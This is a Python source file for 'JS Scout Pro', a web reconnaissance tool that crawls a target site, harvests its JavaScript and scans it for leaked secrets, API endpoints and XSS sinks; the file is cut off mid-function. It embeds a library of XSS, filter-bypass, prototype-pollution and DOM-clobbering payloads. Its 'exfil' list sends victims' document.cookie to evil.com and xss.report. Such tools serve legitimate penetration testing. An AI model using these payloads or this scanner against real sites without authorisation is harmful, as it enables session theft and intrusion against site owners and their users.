#!/usr/bin/env python3
"""
JS Scout Pro v4 — JavaScript Security Reconnaissance Tool
==========================================================
pip install requests bleach flask

CLI:    python3 jsscout.py https://target.com
Web UI: python3 server.py  ->  http://localhost:7331
"""

import re, sys, os, json, time, hashlib, argparse, threading
from pathlib import Path
from queue import Queue, Empty
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from html.parser import HTMLParser

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

# =============================================================================
# SECURITY PATTERNS
# =============================================================================

SECRET_PATTERNS = [
    (re.compile(r'(?:api[_\-]?key|apikey|api_secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', re.I), "api_key", "HIGH"),
    (re.compile(r'(?:access[_\-]?token|auth[_\-]?token)\s*[:=]\s*["\']([a-zA-Z0-9_\-\.]{20,})["\']', re.I), "access_token", "HIGH"),
    (re.compile(r'["\']eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}["\']'), "jwt_token", "HIGH"),
    (re.compile(r'(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{4,})["\']', re.I), "password", "CRITICAL"),
    (re.compile(r'(?:secret|client_secret|private_key)\s*[:=]\s*["\']([^"\']{8,})["\']', re.I), "secret", "HIGH"),
    (re.compile(r'(?:AKIA|ASIA)[A-Z0-9]{16}'), "aws_access_key", "CRITICAL"),
    (re.compile(r'aws[^"\']{0,30}secret[^"\']{0,30}["\']([a-zA-Z0-9/+=]{40})["\']', re.I), "aws_secret", "CRITICAL"),
    (re.compile(r'AIza[a-zA-Z0-9_\-]{35}'), "google_api_key", "HIGH"),
    (re.compile(r'["\']pk_(?:test|live)_[a-zA-Z0-9]{24,}["\']'), "stripe_pk", "CRITICAL"),
    (re.compile(r'["\']sk_(?:test|live)_[a-zA-Z0-9]{24,}["\']'), "stripe_sk", "CRITICAL"),
    (re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}'), "slack_token", "HIGH"),
    (re.compile(r'gh[pousr]_[a-zA-Z0-9]{36,}'), "github_token", "HIGH"),
    (re.compile(r'SG\.[a-zA-Z0-9_\-]{22,}\.[a-zA-Z0-9_\-]{43,}'), "sendgrid_key", "HIGH"),
    (re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----'), "private_key", "CRITICAL"),
    (re.compile(r'(?:firebase|firebaseConfig)[^{]{0,50}apiKey\s*:\s*["\']([^"\']{10,})["\']', re.I), "firebase_key", "HIGH"),
    (re.compile(r'supabase[^"\']{0,60}["\']([a-zA-Z0-9_\-\.]{40,})["\']', re.I), "supabase_key", "HIGH"),
    (re.compile(r'(?:mongodb|postgres|mysql|redis)://[^\s"\'<>]{10,}', re.I), "db_connection", "CRITICAL"),
    (re.compile(r'(?:REACT_APP_|NEXT_PUBLIC_|VUE_APP_)[A-Z_]+\s*[=:]\s*["\']([^"\']{5,})["\']'), "env_var", "MEDIUM"),
    (re.compile(r'"type"\s*:\s*"service_account"'), "gcp_service_account", "CRITICAL"),
    (re.compile(r'(?:authorization|x-api-key)\s*:\s*["\']([^"\']{10,})["\']', re.I), "auth_header", "HIGH"),
]

ENDPOINT_PATTERNS = [
    re.compile(r'["\'`](/api/v?\d+/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/api/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/graphql[a-zA-Z0-9/_\-]*)["\'`]'),
    re.compile(r'["\'`](/rest/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/v[1-9]\d*/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/pages/api/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`]([a-zA-Z0-9/_\-\.{}:]+\.(?:json|xml|yaml))["\'`]'),
    re.compile(r'(?:fetch|axios\.(?:get|post|put|delete|patch)|xhr\.open)\s*\(\s*["\']([^"\']+)["\']', re.I),
    re.compile(r'(?:url|endpoint|baseURL|apiUrl|API_URL)\s*[:=]\s*["\'`]([^"\'`]{5,100})["\'`]', re.I),
    re.compile(r'(?:path|route|action)\s*:\s*["\'`](/[a-zA-Z0-9/_:\-\.]+)["\'`]', re.I),
]

XSS_SINKS = [
    (re.compile(r'\.innerHTML\s*=\s*(?!["\'\s]*["\'])', re.I), "innerHTML", "HIGH"),
    (re.compile(r'\.outerHTML\s*=\s*', re.I), "outerHTML", "HIGH"),
    (re.compile(r'document\.write\s*\(', re.I), "document.write", "HIGH"),
    (re.compile(r'document\.writeln\s*\(', re.I), "document.writeln", "HIGH"),
    (re.compile(r'\.insertAdjacentHTML\s*\(', re.I), "insertAdjacentHTML", "CRITICAL"),
    (re.compile(r'\beval\s*\(', re.I), "eval", "CRITICAL"),
    (re.compile(r'\bnew\s+Function\s*\(', re.I), "new Function()", "CRITICAL"),
    (re.compile(r'setTimeout\s*\(\s*[^,)]+,', re.I), "setTimeout(str)", "HIGH"),
    (re.compile(r'setInterval\s*\(\s*[^,)]+,', re.I), "setInterval(str)", "HIGH"),
    (re.compile(r'window\.location(?:\.href)?\s*=\s*[^"\'`]', re.I), "location.href=", "HIGH"),
    (re.compile(r'location\.(?:replace|assign)\s*\(', re.I), "location.replace/assign", "HIGH"),
    (re.compile(r'\$\([^)]+\)\.html\s*\(', re.I), "$.html()", "HIGH"),
    (re.compile(r'\$\([^)]+\)\.(?:append|prepend|after|before)\s*\(', re.I), "$.append/prepend", "MEDIUM"),
    (re.compile(r'\.attr\s*\(\s*["\'`](?:href|src|action)["\'`]\s*,', re.I), "$.attr(href/src)", "HIGH"),
    (re.compile(r'dangerouslySetInnerHTML\s*=', re.I), "dangerouslySetInnerHTML", "CRITICAL"),
    (re.compile(r'\.srcdoc\s*=', re.I), "iframe.srcdoc", "HIGH"),
    (re.compile(r'createContextualFragment\s*\(', re.I), "createContextualFragment", "CRITICAL"),
    (re.compile(r'\[innerHTML\]\s*=', re.I), "[innerHTML] binding", "HIGH"),
    (re.compile(r'addEventListener\s*\(\s*["\'`]message["\'`]', re.I), "postMessage listener", "MEDIUM"),
    (re.compile(r'\.setAttributeNS?\s*\(\s*(?:null,\s*)?["\'`](?:href|src|action)["\'`]', re.I), "setAttribute(href/src)", "HIGH"),
]

XSS_SOURCES = [
    (re.compile(r'location\.(?:search|hash|href|pathname)', re.I), "location.*"),
    (re.compile(r'document\.(?:URL|documentURI|referrer)', re.I), "document.URL"),
    (re.compile(r'(?:URLSearchParams|searchParams)\.(?:get|getAll)\s*\(', re.I), "URLSearchParams"),
    (re.compile(r'document\.getElementById\([^)]+\)\.value', re.I), "DOM input value"),
    (re.compile(r'(?:localStorage|sessionStorage)\.getItem\s*\(', re.I), "localStorage"),
    (re.compile(r'document\.cookie', re.I), "document.cookie"),
    (re.compile(r'(?:event|e|msg)\.data\b', re.I), "event.data (postMessage)"),
    (re.compile(r'window\.name\b', re.I), "window.name"),
    (re.compile(r'history\.state\b', re.I), "history.state"),
]

PROTO_POLLUTION = [
    (re.compile(r'\[["\'`]__proto__["\'`]\]\s*=', re.I), "direct __proto__ assign", "CRITICAL"),
    (re.compile(r'\.constructor\.prototype\b', re.I), "constructor.prototype", "HIGH"),
    (re.compile(r'\$\.extend\s*\(\s*true\s*,', re.I), "$.extend(true,...)", "HIGH"),
    (re.compile(r'_\.(?:merge|extend|defaultsDeep)\s*\(', re.I), "lodash unsafe merge", "HIGH"),
    (re.compile(r'\.\.\.\s*(?:req|request|params|query|body|input|data)\b', re.I), "spread user input", "HIGH"),
    (re.compile(r'Object\.assign\s*\(\s*(?:this|\{\})', re.I), "Object.assign pollutable", "MEDIUM"),
]

DOM_CLOBBER = [
    (re.compile(r'document\.getElementById\([^)]+\)\.(?:href|src|innerHTML|outerHTML)', re.I), "clobberable element prop", "HIGH"),
    (re.compile(r'window\.(?:name|opener)\s*(?:\|\||&&|\?)', re.I), "window.name clobber", "HIGH"),
    (re.compile(r'document\.forms\[', re.I), "document.forms[]", "MEDIUM"),
    (re.compile(r'(?:config|options|settings|defaults)\s*=\s*(?:window|document)\.\w+', re.I), "DOM config clobber", "HIGH"),
]

KEYWORDS = {
    "admin":           re.compile(r'\badmin\b', re.I),
    "debug":           re.compile(r'\bdebug\b', re.I),
    "internal":        re.compile(r'\binternal\b', re.I),
    "staging":         re.compile(r'\bstaging\b', re.I),
    "localhost":       re.compile(r'\blocalhost\b', re.I),
    "TODO":            re.compile(r'\bTODO\b'),
    "FIXME":           re.compile(r'\bFIXME\b'),
    "hardcoded":       re.compile(r'\bhardcoded?\b', re.I),
    "cors_wildcard":   re.compile(r'Access-Control-Allow-Origin\s*[=:]\s*["\']?\*', re.I),
    "disable_csrf":    re.compile(r'csrf.{0,10}(?:disable|skip|exempt|false)', re.I),
    "open_redirect":   re.compile(r'window\.location\s*=\s*(?:req|params|query|url)', re.I),
    "sql_concat":      re.compile(r'["\'`]\s*\+\s*(?:req|request|params|query|input|user)', re.I),
}

XSS_PAYLOADS = {
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
        "\"><img src=x onerror=alert(1)>",
        "';alert(1)//",
        "'><svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
    ],
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "encoded": [
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    ],
    "filter_bypass": [
        "<sCript>alert(1)</sCript>",
        "<img/src=x/onerror=alert(1)>",
        "<svg/onload=alert(1)//>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<audio src onerror=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
        "<img src=x onerror=alert`1`>",
        "<<script>alert(1)//<</script>",
        "<object data=\"javascript:alert(1)\">",
    ],
    "dom": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ],
    "exfil": [
        "<script>fetch('https://xss.report/c/'+document.cookie)</script>",
        "<img src=x onerror=\"fetch('https://evil.com/c?c='+btoa(document.cookie))\">",
        "<svg onload=\"navigator.sendBeacon('https://evil.com/c',document.cookie)\">",
        "<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>",
        "<script>fetch('https://evil.com',{method:'POST',body:document.cookie})</script>",
    ],
    "waf_bypass": [
        "<img src=x onerror=window['al'+'ert'](1)>",
        "\"-alert(1)-\"",
        "<svg onload=eval(atob('YWxlcnQoMSk='))>",
        "<iframe srcdoc='<script>alert(1)<\\/script>'>",
        "<math><mtext></p><img src=x onerror=alert(1)>",
        "<script>window['ale'+'rt'](1)</script>",
        "<img src=x onerror=top[/al/.source+/ert/.source](1)>",
    ],
    "prototype_pollution": [
        "__proto__[admin]=true",
        "constructor[prototype][isAdmin]=true",
        "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
        "?__proto__[src]=javascript:alert(1)",
        "__proto__[constructor][prototype][admin]=true",
    ],
    "dom_clobbering": [
        "<a id=config><a id=config name=url href=javascript:alert(1)>",
        "<form id=x><output id=y>clobbered</form>",
        "<img name=documentElement>",
        "<a id=defaultView href=javascript:alert(1)>",
        "<form name=location><input name=href value=javascript:alert(1)></form>",
    ],
}


# =============================================================================
# HTML PARSER  —  handles all real-world attribute quirks
# =============================================================================

class PageParser(HTMLParser):
    """
    Extracts JS URLs, page links, and inline script bodies from HTML.
    Uses list-of-tuples for attrs (never dict) to handle duplicate attributes.
    """
    def __init__(self, base_url: str):
        super().__init__(convert_charrefs=True)
        self.base_url      = base_url
        self.base_domain   = urlparse(base_url).netloc
        self.js_urls       : set  = set()
        self.page_links    : set  = set()
        self.inline_scripts: list = []
        self._in_script    = False
        self._script_buf   = []

    def handle_starttag(self, tag: str, attrs):
        # Use last-value-wins dict (safe for our purposes)
        a = {k.lower(): (v or '') for k, v in attrs}

        if tag == 'script':
            self._in_script = True
            self._script_buf = []
            src = a.get('src', '').strip()
            if src:
                url = self._abs(src)
                if url:
                    self.js_urls.add(url)

        elif tag == 'link':
            href = a.get('href', '').strip()
            # rel can be a space-separated list e.g. "preload stylesheet"
            rel  = a.get('rel', '').lower()
            as_  = a.get('as', '').lower()
            if href:
                url = self._abs(href)
                if url:
                    is_js = (href.endswith('.js') or href.endswith('.mjs') or '.js?' in href)
                    if ('modulepreload' in rel or
                        ('preload' in rel and as_ == 'script') or
                        is_js):
                        self.js_urls.add(url)

        elif tag == 'a':
            href = a.get('href', '').strip()
            if href and not href.startswith(('mailto:', 'tel:', 'javascript:', '#', 'data:')):
                url = self._abs(href)
                if url and self._same_domain(url):
                    clean = url.split('#')[0].rstrip('/')
                    if clean:
                        self.page_links.add(clean)

    def handle_endtag(self, tag: str):
        if tag == 'script':
            self._in_script = False
            body = ''.join(self._script_buf).strip()
            if body:
                self.inline_scripts.append(body)
            self._script_buf = []

    def handle_data(self, data: str):
        if self._in_script:
            self._script_buf.append(data)

    def _abs(self, url: str) -> str:
        if not url:
            return ''
        try:
            result = urljoin(self.base_url, url.strip())
            if result.startswith(('http://', 'https://')):
                return result
        except Exception:
            pass
        return ''

    def _same_domain(self, url: str) -> bool:
        try:
            nl = urlparse(url).netloc
            return nl == self.base_domain or nl.endswith('.' + self.base_domain)
        except Exception:
            return False


# =============================================================================
# JS URL EXTRACTION  —  comprehensive regex sweep
# =============================================================================

SKIP_EXTS = {
    '.css','.png','.jpg','.jpeg','.gif','.svg','.ico',
    '.woff','.woff2','.ttf','.eot','.otf',
    '.pdf','.zip','.gz','.tar','.rar',
    '.mp4','.mp3','.webm','.ogg','.wav',
    '.webp','.avif','.bmp','.map',
}

MANIFEST_PATHS = [
    '/asset-manifest.json', '/static/asset-manifest.json',
    '/assets/asset-manifest.json', '/manifest.json',
    '/webpack-manifest.json', '/mix-manifest.json',
    '/assets.json', '/precache-manifest.js',
    '/_next/static/development/_buildManifest.js',
    '/_next/static/development/_ssgManifest.js',
    '/service-worker.js', '/sw.js', '/workbox-precache.js',
]

# Every pattern that can point to a .js file in HTML or JS source
JS_REGEXES = [
    # src= attribute (quoted)
    re.compile(r'src\s*=\s*["\']([^"\']+\.m?js(?:\?[^"\']*)?)["\']', re.I),
    # src= attribute (unquoted)
    re.compile(r'src\s*=\s*([^\s"\'>/]+\.m?js(?:\?[^\s"\'>/]*)?)', re.I),
    # import() / require()
    re.compile(r'(?:import|require)\s*\(\s*["\'`]([^"\'`]+\.m?js(?:\?[^"\'`]*)?)["\'`]\s*\)', re.I),
    # static import
    re.compile(r'import\s+[^"\'`]*["\'`]([^"\'`]+\.m?js)["\'`]', re.I),
    # absolute https?:// JS URLs in quotes
    re.compile(r'["\'`](https?://[^\s"\'`<>]+\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    # /_next/static/ paths
    re.compile(r'["\'`](/_next/static/[^\s"\'`<>]+\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    # Common build output paths
    re.compile(r'["\'`](/(?:assets|static/js|static/chunks|dist|build|js)/[a-zA-Z0-9._/\-]+\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    # Any root-relative .js path
    re.compile(r'["\'`](/[a-zA-Z0-9._/\-]{4,300}\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    # Unquoted absolute CDN URLs
    re.compile(r'https?://[^\s"\'<>]+\.m?js(?:\?[^\s"\'<>]*)?(?=[\s,;>])'),
    # data-src and data-main attributes
    re.compile(r'data-(?:src|main)\s*=\s*["\']([^"\']+\.m?js)["\']', re.I),
]

_WP_CHUNK_MAP = re.compile(r'\{(?:\s*\d+\s*:\s*"[a-f0-9]{4,}"(?:\s*,\s*\d+\s*:\s*"[a-f0-9]{4,}")*\s*)\}')
_WP_CHUNK_ID  = re.compile(r'(\d+)\s*:\s*"([a-f0-9]{4,})"')
_WP_PUB_PATH  = re.compile(r'__webpack_require__\.p\s*=\s*["\'`]([^"\'`]+)["\'`]')
_NEXT_BUILD   = re.compile(r'"buildId"\s*:\s*"([a-zA-Z0-9_\-]{4,})"')
_VITE_ENTRY   = re.compile(r'"([a-zA-Z0-9/_\-\.]+\.m?js)"\s*:')


def extract_js_urls(content: str, base_url: str) -> set:
    """Return all JS URLs found in content (HTML or JS), made absolute."""
    found = set()
    origin = '{0}://{1}'.format(*urlparse(base_url)[:2])

    for pat in JS_REGEXES:
        for m in pat.finditer(content):
            raw = (m.group(1) if m.lastindex else m.group(0)).strip()
            if not raw or raw.startswith(('data:', 'blob:')):
                continue
            if raw.startswith('//'):
                scheme = urlparse(base_url).scheme or 'https'
                raw = scheme + ':' + raw
            elif not raw.startswith('http'):
                raw = urljoin(base_url, raw)
            if raw.startswith(('http://', 'https://')):
                found.add(raw.split('#')[0])

    # Webpack chunk map reconstruction
    pub = base_url.rstrip('/')
    pm  = _WP_PUB_PATH.search(content)
    if pm:
        pp = pm.group(1).strip()
        pub = (origin + pp).rstrip('/') if pp.startswith('/') else urljoin(base_url, pp).rstrip('/')

    for cm in _WP_CHUNK_MAP.finditer(content):
        for em in _WP_CHUNK_ID.finditer(cm.group(0)):
            cid, chash = em.group(1), em.group(2)
            for tmpl in [
                f'/static/js/{cid}.{chash}.chunk.js',
                f'/static/js/{cid}.{chash}.js',
                f'/static/chunks/{cid}.{chash}.js',
                f'/_next/static/chunks/{cid}-{chash}.js',
                f'/_next/static/chunks/{cid}.{chash}.js',
            ]:
                found.add(pub + tmpl)

    # Next.js build ID
    nm = _NEXT_BUILD.search(content)
    if nm:
        bid = nm.group(1)
        for path in [
            f'/_next/static/{bid}/_buildManifest.js',
            f'/_next/static/{bid}/_ssgManifest.js',
            '/_next/static/chunks/main.js',
            '/_next/static/chunks/webpack.js',
            '/_next/static/chunks/framework.js',
            '/_next/static/chunks/pages/_app.js',
        ]:
            found.add(origin + path)

    # Vite manifest
    for vm in _VITE_ENTRY.finditer(content):
        path = vm.group(1)
        if not path.startswith('/'):
            path = '/' + path
        found.add(urljoin(base_url, path))

    return found


# =============================================================================
# CORE SCANNER
# =============================================================================

class JSScout:
    BASE_HEADERS = {
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/122.0.0.0 Safari/537.36'
        ),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }

    def __init__(self, target: str, output_dir: str,
                 threads: int = 10, timeout: int = 15,
                 max_pages: int = 200, depth: int = 3,
                 cookies: str = None, extra_headers: dict = None,
                 log_fn=None):

        if '://' not in target:
            target = 'https://' + target
        parsed           = urlparse(target)
        self.base_url    = f"{parsed.scheme}://{parsed.netloc}"
        self.base_domain = parsed.netloc
        self.output_dir  = Path(output_dir)
        self.threads     = threads
        self.timeout     = timeout
        self.max_pages   = max_pages
        self.depth       = depth
        self.log_fn      = log_fn or print
        self._lock       = threading.Lock()

        self.visited_pages  : set = set()
        self.found_js_urls  : set = set()
        self._dl_hashes     : set = set()

        self.session = requests.Session()
        self.session.headers.update(self.BASE_HEADERS)
        self.session.verify = False
        self.session.max_redirects = 5
        if cookies:
            for pair in cookies.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, _, v = pair.partition('=')
                    self.session.cookies.set(k.strip(), v.strip())
        if extra_headers:
            self.session.headers.update(extra_headers)

        self.results = {
            'target': self.base_url,
            'js_files': [],
            'endpoints': {},
            'secrets': [],
            'xss_findings': [],
            'dom_clobber': [],
            'proto_pollution': [],
            'keywords': {},
            'external_urls': [],
            'payload_library': XSS_PAYLOADS,
        }

    def log(self, msg: str):
        self.log_fn(msg)

    # =========================================================================
    # PUBLIC ENTRY
    # =========================================================================

    def run(self) -> dict:
        t0 = time.time()
        self.output_dir.mkdir(parents=True, exist_ok=True)
        (self.output_dir / 'js').mkdir(exist_ok=True)

        self.log(f"[*] Phase 1: Crawling {self.base_url}  (max_pages={self.max_pages}, depth={self.depth}, threads={self.threads})")
        self._crawl()
        self.log(f"[+] Crawl done: {len(self.visited_pages)} pages visited | {len(self.found_js_urls)} JS URLs discovered")

        self.log(f"[*] Phase 2: Probing {len(MANIFEST_PATHS)} manifest endpoints...")
        self._probe_manifests()
        self.log(f"[+] After manifests: {len(self.found_js_urls)} total JS URLs")

        self.log(f"[*] Phase 3: Downloading {len(self.found_js_urls)} JS files...")
        self._download_all(list(self.found_js_urls))
        dl = len(list((self.output_dir / 'js').glob('*.js')))
        self.log(f"[+] Downloaded {dl} unique JS files (deduped by SHA256)")

        self.log("[*] Phase 4: Deep crawl — scanning JS content for embedded chunk URLs...")
        new = self._js_deep_crawl()
        if new:
            self.log(f"[+] Found {len(new)} more JS URLs inside downloaded files — downloading...")
            self._download_all(list(new))
            dl = len(list((self.output_dir / 'js').glob('*.js')))
            self.log(f"[+] Total after deep crawl: {dl} JS files")

        js_files = sorted((self.output_dir / 'js').glob('*.js'))
        self.log(f"[*] Phase 5: Analyzing {len(js_files)} JS files for secrets, endpoints, XSS sinks...")
        self._analyze_all(js_files)

        self.log("[*] Phase 6: Probing URL parameters for reflected XSS (generating PoC links)...")
        self._probe_params()
        poc_count = sum(1 for x in self.results['xss_findings'] if x.get('poc_urls'))
        self.log(f"[+] {poc_count} findings with exact PoC URLs generated")

        self.log("[*] Phase 7: Writing report...")
        rp = self._write_report()

        elapsed = time.time() - t0
        self.log(f"\n[✓] Done in {elapsed:.1f}s")
        self.log(f"    JS files  : {len(self.results['js_files'])}")
        self.log(f"    Endpoints : {len(self.results['endpoints'])}")
        self.log(f"    Secrets   : {len(self.results['secrets'])}")
        self.log(f"    XSS sinks : {len(self.results['xss_findings'])} ({sum(1 for x in self.results['xss_findings'] if x.get('confirmed_flow'))} confirmed)")
        self.log(f"    Report    : {rp}")
        return self.results

    # =========================================================================
    # PHASE 1: BFS CRAWLER  —  work-queue + counter pattern (no race conditions)
    # =========================================================================

    def _crawl(self):
        """
        BFS using a Queue and an atomic counter.
        counter tracks how many tasks are either in the queue OR being processed.
        Only exits when counter == 0 (nothing left anywhere).
        """
        q       = Queue()
        counter = threading.Semaphore(0)   # re-used as a counter

        # We track the count manually with a regular int + lock
        self._active = 0
        self._active_lock = threading.Lock()

        def enqueue(url, depth):
            with self._active_lock:
                self._active += 1
            q.put((url, depth))

        def done_one():
            with self._active_lock:
                self._active -= 1

        # Seed
        self.visited_pages.add(self.base_url)
        enqueue(self.base_url, 0)

        def worker():
            while True:
                try:
                    url, depth = q.get(timeout=2.0)
                except Empty:
                    # Check if anything is still in flight
                    with self._active_lock:
                        if self._active == 0:
                            return
                    continue

                try:
                    new_pages = self._crawl_page(url, depth)
                    if depth < self.depth:
                        for link in new_pages:
                            with self._lock:
                                if link not in self.visited_pages and len(self.visited_pages) < self.max_pages:
                                    self.visited_pages.add(link)
                                    enqueue(link, depth + 1)
                finally:
                    done_one()

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futs = [pool.submit(worker) for _ in range(self.threads)]
            for f in futs:
                f.result()

    def _crawl_page(self, url: str, depth: int) -> set:
        """
        Fetch one page. Returns set of new page links to enqueue.
        Adds discovered JS URLs to self.found_js_urls directly.
        """
        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
        except requests.exceptions.SSLError:
            try:
                resp = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            except Exception as e:
                self.log(f"  [!] {url[:70]} — {type(e).__name__}")
                return set()
        except Exception as e:
            self.log(f"  [!] {url[:70]} — {type(e).__name__}")
            return set()

        if resp.status_code >= 400:
            return set()

        ct = resp.headers.get('content-type', '').lower()
        if not any(t in ct for t in ('html', 'javascript', 'text', 'json', 'xml')):
            return set()

        content = resp.text[:5_000_000]   # 5 MB cap

        new_js    = set()
        new_pages = set()

        if 'html' in ct:
            parser = PageParser(url)
            try:
                parser.feed(content)
            except Exception:
                pass
            new_js.update(parser.js_urls)
            # Scan inline scripts too
            for inline in parser.inline_scripts:
                new_js.update(extract_js_urls(inline, url))
            # Collect page links
            for link in parser.page_links:
                ext = Path(urlparse(link).path).suffix.lower()
                if ext not in SKIP_EXTS:
                    new_pages.add(link)

        # Regex sweep on all content
        new_js.update(extract_js_urls(content, url))

        # Commit JS URLs
        with self._lock:
            added = len(new_js - self.found_js_urls)
            self.found_js_urls.update(new_js)

        self.log(f"  [page] {resp.status_code} {url[:75]}  +{len(new_js)} JS")
        return new_pages

    # =========================================================================
    # PHASE 2: MANIFEST PROBING
    # =========================================================================

    def _probe_manifests(self):
        def probe(path: str):
            url = self.base_url.rstrip('/') + path
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code != 200:
                    return
                content = resp.text
                new_js  = extract_js_urls(content, url)
                if path.endswith('.json'):
                    try:
                        self._extract_js_from_json(resp.json(), url)
                    except Exception:
                        pass
                with self._lock:
                    added = len(new_js - self.found_js_urls)
                    if added:
                        self.found_js_urls.update(new_js)
                        self.log(f"  [manifest] {path}  +{added}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            list(pool.map(probe, MANIFEST_PATHS))

    def _extract_js_from_json(self, data, base_url: str):
        if isinstance(data, dict):
            for v in data.values():
                if isinstance(v, str) and (v.endswith('.js') or '.js?' in v):
                    url = urljoin(base_url, v)
                    if url.startswith('http'):
                        with self._lock:
                            self.found_js_urls.add(url)
                elif isinstance(v, (dict, list)):
                    self._extract_js_from_json(v, base_url)
        elif isinstance(data, list):
            for item in data:
                self._extract_js_from_json(item, base_url)

    # =========================================================================
    # PHASE 3: DOWNLOAD
    # =========================================================================

    def _download_all(self, urls: list):
        js_dir         = self.output_dir / 'js'
        existing_names : set = {f.name for f in js_dir.glob('*.js')}

        def dl(url: str):
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                if resp.status_code != 200:
                    return
                data = resp.content
                if not data or len(data) < 10:
                    return

                h = hashlib.sha256(data).hexdigest()[:16]
                with self._lock:
                    if h in self._dl_hashes:
                        return
                    self._dl_hashes.add(h)

                # Build filename
                path = urlparse(url).path
                name = os.path.basename(path) or 'script.js'
                if not name.endswith(('.js', '.mjs')):
                    name += '.js'
                name = re.sub(r'[^\w.\-]', '_', name)[:120]
                if not name or name in ('.js', '_.js', '_.mjs'):
                    name = 'script.js'

                with self._lock:
                    if name in existing_names:
                        stem = name[:-3]
                        i = 1
                        while f'{stem}_{i}.js' in existing_names:
                            i += 1
                        name = f'{stem}_{i}.js'
                    existing_names.add(name)

                (js_dir / name).write_bytes(data)
                self.log(f"  [dl] {name}  {len(data)/1024:.1f}KB  <- {url[:75]}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            pool.map(dl, urls)

    # =========================================================================
    # PHASE 4: JS DEEP CRAWL
    # =========================================================================

    def _js_deep_crawl(self) -> set:
        new_urls = set()
        for js_file in (self.output_dir / 'js').glob('*.js'):
            try:
                content = js_file.read_text(encoding='utf-8', errors='replace')
                found   = extract_js_urls(content, self.base_url)
                with self._lock:
                    truly_new = found - self.found_js_urls
                    self.found_js_urls.update(truly_new)
                    new_urls.update(truly_new)
            except Exception:
                pass
        return new_urls

    # =========================================================================
    # PHASE 5: ANALYSIS
    # =========================================================================

    def _analyze_all(self, js_files: list):
        endpoints = {}
        secrets   = []
        xss       = []
        dom_cb    = []
        proto     = []
        keywords  = defaultdict(list)
        ext_urls  = set()
        stats     = []

        for js_file in js_files:
            try:
                content = js_file.read_text(encoding='utf-8', errors='replace')
                fname   = js_file.name

                for ep in self._find_endpoints(content):
                    if ep not in endpoints:
                        endpoints[ep] = []
                    if fname not in endpoints[ep]:
                        endpoints[ep].append(fname)

                fs = self._find_secrets(content, fname);  secrets.extend(fs)
                fx = self._find_xss(content, fname);      xss.extend(fx)
                fd = self._find_dom_clobber(content, fname); dom_cb.extend(fd)
                fp = self._find_proto(content, fname);    proto.extend(fp)

                lines = content.split('\n')
                for kw, pat in KEYWORDS.items():
                    for i, line in enumerate(lines, 1):
                        if pat.search(line):
                            keywords[kw].append({'file': fname, 'line': i, 'content': line.strip()[:200]})
                            if len(keywords[kw]) >= 15:
                                break

                for m in re.finditer(r'["\'`](https?://[a-zA-Z0-9._\-/:%?#=&+@\[\]{}]+)["\'`]', content):
                    u = m.group(1)
                    if urlparse(u).netloc != self.base_domain:
                        ext_urls.add(u)

                n_ep  = sum(1 for files in endpoints.values() if fname in files)
                n_sec = len(fs); n_xss = len(fx)
                stats.append({'name': fname, 'size': js_file.stat().st_size,
                               'endpoints': n_ep, 'secrets': n_sec,
                               'xss_sinks': n_xss, 'minified': self._is_minified(content)})
